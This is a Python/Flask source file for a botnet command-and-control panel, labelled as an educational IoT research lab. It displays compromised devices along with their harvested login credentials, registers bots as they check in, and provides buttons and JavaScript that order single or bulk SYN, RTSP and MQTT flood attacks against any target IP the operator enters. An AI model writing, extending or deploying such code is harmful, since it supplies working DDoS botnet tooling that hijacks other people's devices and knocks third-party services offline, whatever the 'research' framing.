# C2 server web interface
from flask import render_template_string, jsonify, request
import logging

# HTML template for web interface
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>IoT C2 Research Panel</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            margin: 0; 
            padding: 20px; 
            background-color: #f5f5f5; 
        }
        .container { 
            max-width: 1400px; 
            margin: 0 auto; 
            background: white; 
            border-radius: 8px; 
            box-shadow: 0 2px 10px rgba(0,0,0,0.1); 
            overflow: hidden;
        }
        .header { 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
            color: white; 
            padding: 20px; 
            text-align: center; 
        }
        .header h1 { margin: 0; font-size: 24px; }
        .stats { 
            display: flex; 
            background: #f8f9fa; 
            border-bottom: 1px solid #dee2e6; 
        }
        .stat-box { 
            flex: 1; 
            padding: 15px; 
            text-align: center; 
            border-right: 1px solid #dee2e6; 
        }
        .stat-box:last-child { border-right: none; }
        .stat-number { font-size: 24px; font-weight: bold; color: #495057; }
        .stat-label { font-size: 12px; color: #6c757d; text-transform: uppercase; }
        .section { 
            margin: 20px; 
            background: white; 
            border-radius: 6px; 
            overflow: hidden; 
            border: 1px solid #dee2e6;
        }
        .section-header { 
            background: #f8f9fa; 
            padding: 12px 16px; 
            border-bottom: 1px solid #dee2e6; 
            font-weight: 600; 
            font-size: 16px; 
        }
        table { 
            width: 100%; 
            border-collapse: collapse; 
        }
        th, td { 
            padding: 12px 16px; 
            text-align: left; 
            border-bottom: 1px solid #f1f3f4; 
        }
        th { 
            background-color: #f8f9fa; 
            font-weight: 600; 
            font-size: 14px; 
            color: #495057; 
        }
        td { font-size: 14px; }
        .status-online { 
            background: #d4edda; 
            color: #155724; 
            padding: 4px 8px; 
            border-radius: 12px; 
            font-size: 12px; 
            font-weight: 500; 
        }
        .btn { 
            padding: 6px 12px; 
            margin: 2px; 
            border: none; 
            border-radius: 4px; 
            cursor: pointer; 
            font-size: 12px; 
            font-weight: 500; 
            transition: all 0.2s; 
        }
        .btn-attack { background: #dc3545; color: white; }
        .btn-attack:hover { background: #c82333; }
        .btn-stop { background: #6c757d; color: white; }
        .btn-stop:hover { background: #5a6268; }
        .btn-bulk { 
            background: #007bff; 
            color: white; 
            padding: 10px 20px; 
            margin: 10px; 
            font-size: 14px; 
        }
        .btn-bulk:hover { background: #0056b3; }
        .ip-address { font-family: 'Courier New', monospace; color: #495057; }
        .credentials { font-family: 'Courier New', monospace; font-size: 12px; color: #6c757d; }
        .empty-state { 
            text-align: center; 
            padding: 40px; 
            color: #6c757d; 
        }
        .bulk-actions { 
            background: #f8f9fa; 
            padding: 15px; 
            border-bottom: 1px solid #dee2e6; 
            text-align: center; 
        }
        tr:hover { background-color: #f8f9fa; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>IoT Security Research - C2 Panel</h1>
            <p style="margin: 5px 0 0 0; opacity: 0.9;">Educational Lab Environment</p>
        </div>

        <div class="stats">
            <div class="stat-box">
                <div class="stat-number">{{ bots|length }}</div>
                <div class="stat-label">Compromised Devices</div>
            </div>
            <div class="stat-box">
                <div class="stat-number">{{ scan_results|length }}</div>
                <div class="stat-label">Discovered Targets</div>
            </div>
            <div class="stat-box">
                <div class="stat-number">{{ active_sessions }}</div>
                <div class="stat-label">Active Sessions</div>
            </div>
        </div>

        <div class="section">
            <div class="section-header">Compromised Devices</div>
            {% if bots %}
            <div class="bulk-actions">
                <button class="btn btn-bulk" onclick="startBulkAttack()">Start Bulk Attack</button>
                <button class="btn btn-bulk btn-stop" onclick="stopAllAttacks()">Stop All Attacks</button>
            </div>
            <table>
                <thead>
                    <tr>
                        <th>IP Address</th>
                        <th>Credentials</th>
                        <th>Status</th>
                        <th>Last Seen</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    {% for bot in bots %}
                    <tr>
                        <td class="ip-address">{{ bot.ip }}</td>
                        <td class="credentials">{{ bot.username }}:{{ bot.password }}</td>
                        <td><span class="status-online">{{ bot.status }}</span></td>
                        <td>{{ bot.last_seen }}</td>
                        <td>
                            <button class="btn btn-attack" onclick="startAttack('{{ bot.ip }}')">Attack</button>
                            <button class="btn btn-stop" onclick="stopAttack('{{ bot.ip }}')">Stop</button>
                        </td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
            {% else %}
            <div class="empty-state">
                <p>No compromised devices available</p>
                <p style="font-size: 12px;">Run the exploit script to discover and compromise devices</p>
            </div>
            {% endif %}
        </div>

        {% if scan_results %}
        <div class="section">
            <div class="section-header">Discovered Targets</div>
            <table>
                <thead>
                    <tr>
                        <th>IP Address</th>
                        <th>Port</th>
                        <th>Service</th>
                        <th>Discovered</th>
                    </tr>
                </thead>
                <tbody>
                    {% for result in scan_results %}
                    <tr>
                        <td class="ip-address">{{ result.ip }}</td>
                        <td>{{ result.port }}</td>
                        <td>{{ result.service }}</td>
                        <td>{{ result.timestamp }}</td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
        {% endif %}
    </div>

    <script>
        function startAttack(botIp) {
            const target = prompt('Enter target IP address:');
            if (!target) return;
            
            const attackType = prompt('Attack type:\\nsyn - HTTP flood (port 80)\\nrtsp - RTSP flood (port 554)\\nmqtt - MQTT flood (port 1883)\\n\\nEnter type:');
            if (!attackType || !['syn', 'rtsp', 'mqtt'].includes(attackType.toLowerCase())) {
                alert('Invalid attack type. Use: syn, rtsp, or mqtt');
                return;
            }
            
            fetch('/start-attack', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    bot_ip: botIp,
                    target: target,
                    attack_type: attackType.toLowerCase()
                })
            }).then(response => response.json())
              .then(data => {
                  if (data.status === 'success') {
                      alert('✓ Attack started successfully');
                  } else {
                      alert('✗ Failed to start attack: ' + data.error);
                  }
              })
              .catch(err => alert('Error: ' + err));
        }

        function stopAttack(botIp) {
            if (!confirm('Stop attack on ' + botIp + '?')) return;
            
            fetch('/stop-attack', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({bot_ip: botIp})
            }).then(response => response.json())
              .then(data => alert(data.message))
              .catch(err => alert('Error: ' + err));
        }

        function startBulkAttack() {
            const target = prompt('Enter target IP for bulk attack:');
            if (!target) return;
            
            const attackType = prompt('Attack type (syn/rtsp/mqtt):');
            if (!attackType || !['syn', 'rtsp', 'mqtt'].includes(attackType.toLowerCase())) {
                alert('Invalid attack type');
                return;
            }
            
            if (!confirm(`Start ${attackType.toUpperCase()} attack on ALL devices against ${target}?`)) return;
            
            fetch('/start-telnet-ddos', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    target: target,
                    attack_type: attackType.toLowerCase()
                })
            }).then(response => response.json())
              .then(data => {
                  if (data.status === 'success') {
                      alert(`✓ ${data.message}`);
                      setTimeout(() => location.reload(), 2000);
                  } else {
                      alert(`✗ ${data.error}`);
                  }
              })
              .catch(err => alert('Error: ' + err));
        }

        function stopAllAttacks() {
            if (!confirm('Stop all active attacks?')) return;
            
            fetch('/stop-telnet-ddos', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'}
            }).then(response => response.json())
              .then(data => {
                  alert(data.message);
                  setTimeout(() => location.reload(), 1000);
              })
              .catch(err => alert('Error: ' + err));
        }

        // Auto-refresh every 30 seconds
        setInterval(() => location.reload(), 30000);
    </script>
</body>
</html>
'''

def render_dashboard(bots, scan_results, active_sessions):
    """Render the main dashboard"""
    return render_template_string(HTML_TEMPLATE,
                                bots=bots,
                                scan_results=scan_results,
                                active_sessions=active_sessions)

def handle_bot_checkin(db_manager, data):
    """Handle bot check-in and device registration"""
    try:
        if not data:
            logging.error("No data provided in bot-checkin request")
            return jsonify({'error': 'No data provided'}), 400
            
        bot_ip = data.get('ip')
        username = data.get('username')
        password = data.get('password')
        status = data.get('status', 'online')

        if not bot_ip:
            logging.error("Missing bot IP in registration request")
            return jsonify({'error': 'Missing bot IP'}), 400

        logging.info(f"Registering device: IP={bot_ip}, Username='{username}', Password='{password}', Status={status}")

        # Register device with credentials
        success = db_manager.register_device(bot_ip, username, password)
        
        if success:
            logging.info(f"✓ Successfully registered device {bot_ip} with '{username}':'{password}'")
            return jsonify({'status': 'success', 'message': 'Device registered successfully'})
        else:
            logging.error(f"✗ Failed to register device {bot_ip}")
            return jsonify({'error': 'Failed to register device'}), 500

    except Exception as e:
        logging.error(f"Error in bot check-in: {e}")
        return jsonify({'error': str(e)}), 500
